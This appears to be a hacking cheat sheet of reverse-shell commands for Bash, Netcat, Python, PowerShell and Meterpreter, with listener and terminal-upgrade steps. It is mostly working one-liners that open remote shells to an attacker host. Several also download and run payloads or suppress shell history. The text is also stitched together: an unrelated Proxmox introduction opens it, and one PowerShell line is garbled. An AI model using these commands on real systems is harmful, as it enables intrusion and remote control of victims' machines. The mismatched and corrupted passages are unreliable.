## Reverse Shells Commands – cheat sheet

Proxmox commands cheat sheet terminal output
Managing Proxmox Virtual Environment (PVE) through the command line can significantly speed up administration tasks, especially when working with multiple nodes or large clusters.
This Proxmox command cheat sheet provides the most commonly used CLI commands for:

- Node management
- VM and container operations
- Storage administration
- Networking configuration
- Cluster control
- Backup & restore
- System maintenance

## Reverse Shells

### Bash

```bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f
```

### Netcat

```bash
root@kali:$ {nc.tradentional|nc|ncat|netcat} <LHOST> <LPORT> {-e|-c} /bin/bash
```

### Python

#### IPv4

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
```

#### IPv6

```python
root@kali:$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
root@kali:$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
```

### PowerShell

Invoke-Expression (UTF-16LE):

```bash
root@kali:$ echo -n "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/[1]')" | iconv -t UTF-16LE | base64 -w0; echo
PS > powershell -NoP -EncodedCommand <BASE64_COMMAND_HERE>
```

1. [github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

Invoke-WebRequest + `nc.exe` **[1]**:

```bash
PS > powershell -NoP IWR -Uri http://127.0.0.1/nc.exe -OutFile C:\Windows\Temp\nc.exe
PS > cmd /c C:\Windows\Temp\nc.exe 127.0.0.1 1337 -e powershell
```

1. [eternallybored.org/misc/netcat/](https://eternallybored.org/misc/netcat/)

System.Net.Sockets.TCPClient:

```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.234",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0,ytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendbac "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```


### Meterpreter

PowerShell + msfvenom:

```
root@kali:$ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 LHOST=127.0.0.1 LPORT=1337 -f exe > met.exe
PS > (New-Object Net.WebClient).DownloadFile("met.exe", "$env:TEMP\met.exe")
...start metasploit listener...
PS > Start-Process "$env:TEMP\met.exe"
```

PowerShell + unicorn **[1]**:

```
root@kali:$ ./unicorn.py windows/meterpreter/reverse_https LHOST 443
root@kali:$ service postgresql start
root@kali:$ msfconsole -r unicorn.rc
PS > powershell -NoP IEX (New-Object Net.WebClient).DownloadString('powershell_attack.txt')
```

1. [github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)



### Listeners

```
root@kali:$ {nc.tradentional|nc|ncat|netcat} [-6] -lvnp <LPORT>
```



### Upgrade to PTY

```
$ python -c 'import pty; pty.spawn("/bin/bash")'
Or
$ script -q /dev/null sh

user@remote:$ ^Z
(background)

root@kali:$ stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
(get ROWS and COLS)

root@kali:$ stty raw -echo; fg

(?) user@remote:$ reset

user@remote:$ stty rows ${ROWS} cols ${COLS}

user@remote:$ export TERM=xterm
(or xterm-color or xterm-256color)

(?) user@remote:$ exec /bin/bash [-l]
```

1. [forum.hackthebox.eu/discussion/comment/22312#Comment_22312](https://forum.hackthebox.eu/discussion/comment/22312#Comment_22312)
2. [xakep.ru/2019/07/16/mischief/#toc05.1](https://xakep.ru/2019/07/16/mischief/#toc05.1)
